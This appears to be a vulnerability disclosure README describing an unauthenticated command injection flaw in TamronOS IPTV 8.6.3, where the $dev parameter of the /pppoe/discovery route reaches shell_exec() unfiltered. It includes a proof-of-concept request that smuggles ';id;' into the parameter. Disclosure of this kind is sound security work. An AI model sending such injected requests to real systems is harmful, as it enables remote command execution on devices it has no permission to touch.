# Tamronos-iptv-pppoediscovery-rce


The TamronOS IPTV system has command execution vulnerabilities

official website：http://www.tamronos.com/


## Vulnerability Details

The `pppoediscovery` method in the `iptv/Controllers/WidgetController.php` file does not perform filtering verification on the `$dev` passed in by the user. Instead, it is directly passed into function `shell_exec()` and can be used `;` Truncating the command resulted in command injection.
![pppoediscovery](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/pppoediscovery.png)


The path to access the method is defined in the routes.php file of the program.

![routes](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/routes_pppoe.png)


Access the `/pppoe/discovery` path to call the `pppoeiscovery` method


## Recurrence vulnerability


Test version : `TamronOS IPTV 8.6.3`
![version](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/version.png)

request `http://172.16.49.166/pppoe/discovery?dev=;id;`

![request_discovery](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/request_discovery.png)

